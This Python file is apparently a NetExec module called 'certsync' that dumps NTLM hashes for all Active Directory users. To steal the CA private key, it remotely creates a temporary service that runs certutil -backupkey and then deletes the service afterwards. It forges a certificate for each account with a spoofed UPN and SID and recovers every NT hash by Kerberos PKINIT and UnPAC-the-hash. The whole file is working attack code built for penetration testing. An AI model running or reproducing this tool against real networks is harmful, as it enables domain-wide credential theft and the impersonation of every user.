import datetime as dt
import os

from cryptography import x509
from impacket.dcerpc.v5 import rpcrt, scmr
from ldap3.protocol.formatters.formatters import format_sid

from certipy.commands.auth import Authenticate
from certipy.commands.ca import CA
from certipy.commands.forge import Forge
from certipy.lib.certificate import cert_id_to_parts, create_pfx, generate_rsa_key, get_identities_from_certificate, get_object_sid_from_certificate, get_subject_from_str, load_pfx
from certipy.lib.ldap import LDAPConnection
from certipy.lib.rpc import get_dce_rpc
from certipy.lib.target import DnsResolver, Target

from nxc.helpers.misc import CATEGORY
from nxc.helpers.path import sanitize_path_component
from nxc.paths import NXC_PATH


class NXCModule:
    name = "certsync"
    description = "Dump NTLM hashes without DRSUAPI, through golden certificates and UnPAC the hash (technique by zblurx)"
    supported_protocols = ["ldap"]
    category = CATEGORY.CREDENTIAL_DUMPING

    # ACCOUNTDISABLE bit of userAccountControl, matched server-side with the LDAP_MATCHING_RULE_BIT_AND OID
    DISABLED_ACCOUNT_FILTER = "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
    EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"

    def options(self, context, module_options):
        """
        CA_PFX        CA certificate+private key PFX to forge with; if omitted the CA key is dumped remotely (requires admin on the CA host)
        CA_PFX_PASS   Password protecting CA_PFX (optional)
        USER          Only dump this sAMAccountName (optional)
        ENABLED       Only dump enabled accounts when set to true (optional)
        """
        self.ca_pfx = module_options.get("CA_PFX")
        self.ca_pfx_pass = module_options.get("CA_PFX_PASS")
        self.user = module_options.get("USER")
        self.enabled = module_options.get("ENABLED", "").lower() in ("true", "1", "yes")

    def on_login(self, context, connection):
        target = self.make_target(connection)
        ldap_conn = LDAPConnection(target=target)
        try:
            ldap_conn.connect()
        except Exception as e:
            context.log.fail(f"LDAP connection failed: {e}")
            return

        self.domain = connection.domain
        users = self.enum_users(ldap_conn)
        if not users:
            context.log.fail(f"No users found{f' matching {self.user}' if self.user else ''}")
            return
        context.log.display(f"Found {len(users)} user(s) in LDAP")

        ca_key, ca_cert = self.load_ca(context, connection, ldap_conn)
        if ca_key is None or ca_cert is None:
            context.log.fail("No CA certificate/private key available (backup failed or bad CA_PFX); aborting")
            return

        output_filename = connection.output_file_template.format(output_folder="ntds")
        os.makedirs(os.path.dirname(output_filename), exist_ok=True)
        outfile = f"{output_filename}.ntds"

        context.log.success("Forging certificates and UnPACing the hashes, this could take a while so go grab a redbull...")
        forger = Forge()
        user_key = generate_rsa_key(2048)  # one throwaway key reused for every account: the keygen is the slow part
        dumped = added = 0
        with open(outfile, "w") as results:
            for sam, sid in users:
                rid = sid.rsplit("-", 1)[-1]
                try:
                    cert = self.forge_user_cert(forger, ca_key, ca_cert, user_key, f"{sam}@{self.domain}", sid)
                    nthash = self.unpac_user(target, cert, user_key, sam)
                except Exception as e:
                    context.log.debug(f"{sam} failed: {e}")
                    nthash = None
                if not nthash:
                    continue
                line = f"{self.domain}\\{sam}:{rid}:{self.EMPTY_LM}:{nthash}:::"
                context.log.highlight(line)
                results.write(line + "\n")
                dumped += 1
                if "$" not in sam:
                    connection.db.add_credential("hash", self.domain, sam, f"{self.EMPTY_LM}:{nthash}")
                    added += 1

        context.log.success(f"Dumped {dumped} hashes to {outfile} of which {added} were added to the database")

    def make_target(self, connection, remote_name=None, target_ip=None):
        dns_server = getattr(connection.args, "dns_server", None) or connection.kdcHost or connection.host
        resolver = DnsResolver.create(ns=dns_server, dc_ip=connection.kdcHost or connection.host)
        if remote_name and not target_ip:
            target_ip = resolver.resolve(remote_name)
        return Target(
            resolver=resolver,
            domain=connection.domain,
            username=connection.username,
            password=connection.password,
            remote_name=remote_name or connection.remoteName,
            hashes=f"{connection.lmhash}:{connection.nthash}",
            lmhash=connection.lmhash,
            nthash=connection.nthash,
            do_kerberos=connection.kerberos,
            aes=connection.aesKey,
            dc_ip=connection.kdcHost or connection.host,
            target_ip=target_ip or connection.kdcHost or connection.host,
            ldap_scheme="ldaps" if connection.port == 636 else "ldap",
        )

    def enum_users(self, ldap_conn):
        user_filter = (
            "(&(objectClass=user)(objectCategory=person)"
            + (f"(sAMAccountName={self.user})" if self.user else "")
            + (self.DISABLED_ACCOUNT_FILTER if self.enabled else "")
            + ")"
        )
        users = []
        for entry in ldap_conn.search(search_filter=user_filter, attributes=["objectSid", "sAMAccountName"]):
            raw_sid = entry.get_raw("objectSid")
            sam = entry.get("sAMAccountName")
            if raw_sid and sam:
                users.append((sam, format_sid(raw_sid[0])))
        return users

    def load_ca(self, context, connection, ldap_conn):
        if not self.ca_pfx:
            return self.dump_ca_pki(context, connection, ldap_conn)

        ca_pass = self.ca_pfx_pass.encode() if self.ca_pfx_pass else None
        with open(self.ca_pfx, "rb") as ca_file:
            ca_key, ca_cert = load_pfx(ca_file.read(), ca_pass)
        context.log.debug(f"Loaded CA certificate and private key from {self.ca_pfx}")
        return ca_key, ca_cert

    def dump_ca_pki(self, context, connection, ldap_conn):
        cas = ldap_conn.search("(&(objectClass=pKIEnrollmentService))", search_base=f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{ldap_conn.configuration_path}", attributes=["name", "dNSHostName"])
        if not cas:
            context.log.fail("No certificate authority found in LDAP")
            return None, None

        ca = cas[0]
        if len(cas) > 1:
            context.log.debug(f"{len(cas)} CAs found, using the first one: {ca.get('name')}")
        ca_name = ca.get("name")
        ca_dns = ca.get("dNSHostName")
        ca_target = self.make_target(connection, remote_name=ca_dns)
        context.log.debug(f"Dumping CA key of '{ca_name}' from {ca_dns}")
        ca_key, ca_cert = self.backup_ca_pki(context, CA(target=ca_target, ca=ca_name))
        if ca_key and ca_cert:
            self.save_ca_pfx(context, ca_key, ca_cert, ca_name)
        return ca_key, ca_cert

    def save_ca_pfx(self, context, ca_key, ca_cert, ca_name):
        output_dir = os.path.join(NXC_PATH, "modules", "certsync")
        os.makedirs(output_dir, exist_ok=True)
        output_path = os.path.join(output_dir, sanitize_path_component(f"{ca_name}.pfx"))
        with open(output_path, "wb") as pfx_file:
            pfx_file.write(create_pfx(ca_key, ca_cert))
        context.log.highlight(f"CA PFX saved to {output_path} (reuse with -o CA_PFX= to forge offline)")

    def backup_ca_pki(self, context, ca_module):
        # Dump the CA key by running certutil -backupkey through a temporary service on the CA host
        dce = get_dce_rpc(scmr.MSRPC_UUID_SCMR, "\\pipe\\svcctl", ca_module.target, timeout=ca_module.timeout, dynamic=ca_module.dynamic, auth_level_np=rpcrt.RPC_C_AUTHN_LEVEL_NONE)
        if dce is None:
            context.log.fail("Failed to connect to the Service Control Manager on the CA host")
            return None, None

        try:
            handle = scmr.hROpenSCManagerW(dce)["lpScHandle"]
        except Exception as e:
            context.log.fail(f"Could not dump the CA key: admin rights on the CA host are required, or provide one with CA_PFX ({e})")
            return None, None
        config = f" -config {ca_module.config}" if ca_module.config else ""
        backup_cmd = (
            f"cmd.exe /c certutil{config} -backupkey -f -p certipy C:\\Windows\\Tasks\\Certipy && "
            "move /y C:\\Windows\\Tasks\\Certipy\\* C:\\Windows\\Tasks\\certipy.pfx"
        )

        try:
            service_handle = scmr.hRCreateServiceW(dce, handle, "Certipy", "Certipy", lpBinaryPathName=backup_cmd, dwStartType=scmr.SERVICE_DEMAND_START)["lpServiceHandle"]
        except Exception as e:
            if "ERROR_SERVICE_EXISTS" not in str(e):
                context.log.fail(f"Failed to create the backup service: {e}")
                return None, None
            service_handle = scmr.hROpenServiceW(dce, handle, "Certipy")["lpServiceHandle"]
            scmr.hRChangeServiceConfigW(dce, service_handle, lpBinaryPathName=backup_cmd)

        key = cert = None
        try:
            try:
                scmr.hRStartServiceW(dce, service_handle)
            except Exception as e:
                context.log.debug(f"Backup service start returned: {e}")
            pfx = ca_module.get_backup()
            if pfx:
                key, cert = load_pfx(pfx, b"certipy")
        except Exception as e:
            context.log.fail(f"CA backup failed: {e}")
        finally:
            self.cleanup_ca_backup(context, dce, service_handle)
        return key, cert

    def cleanup_ca_backup(self, context, dce, service_handle):
        cleanup_cmd = "cmd.exe /c del /f /q C:\\Windows\\Tasks\\Certipy\\* && rmdir C:\\Windows\\Tasks\\Certipy"
        try:
            scmr.hRChangeServiceConfigW(dce, service_handle, lpBinaryPathName=cleanup_cmd)
            scmr.hRStartServiceW(dce, service_handle)
        except Exception as e:
            context.log.debug(f"Backup directory cleanup returned: {e}")
        try:
            scmr.hRDeleteService(dce, service_handle)
            scmr.hRCloseServiceHandle(dce, service_handle)
        except Exception as e:
            context.log.fail(f"Failed to delete the temporary 'Certipy' service on the CA host, remove it manually: {e}")

    def forge_user_cert(self, forger, ca_key, ca_cert, user_key, upn, sid):
        forger.alt_upn = upn
        forger.alt_sid = sid
        now = dt.datetime.now(dt.UTC)
        builder = (
            x509.CertificateBuilder()
            .subject_name(get_subject_from_str(f"CN={cert_id_to_parts([('UPN', upn)])[0]}"))
            .issuer_name(ca_cert.subject)
            .public_key(user_key.public_key())
            .serial_number(forger.get_serial_number())
            .not_valid_before(now - dt.timedelta(days=1))
            .not_valid_after(now + dt.timedelta(days=365))
            .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()), False)
            .add_extension(x509.SubjectKeyIdentifier.from_public_key(user_key.public_key()), False)
        )
        sans = forger.create_subject_alternative_names()
        if sans:
            builder = builder.add_extension(x509.SubjectAlternativeName(sans), False)
        sid_extension = forger.create_sid_extension()
        if sid_extension:
            builder = builder.add_extension(sid_extension, False)
        return builder.sign(ca_key, forger.get_allowed_hash_algorithm(ca_cert.signature_hash_algorithm))

    def unpac_user(self, target, cert, key, sam):
        auth = Authenticate(target=target)
        auth.cert = cert
        auth.key = key
        auth.no_save = True
        identities = get_identities_from_certificate(cert)
        id_type, identity = identities[0] if identities else (None, None)
        object_sid = get_object_sid_from_certificate(cert)
        if auth.kerberos_authentication(sam.lower(), self.domain.lower(), False, id_type, identity, object_sid, f"{sam}@{self.domain}".lower()):
            return auth.nt_hash
        return None
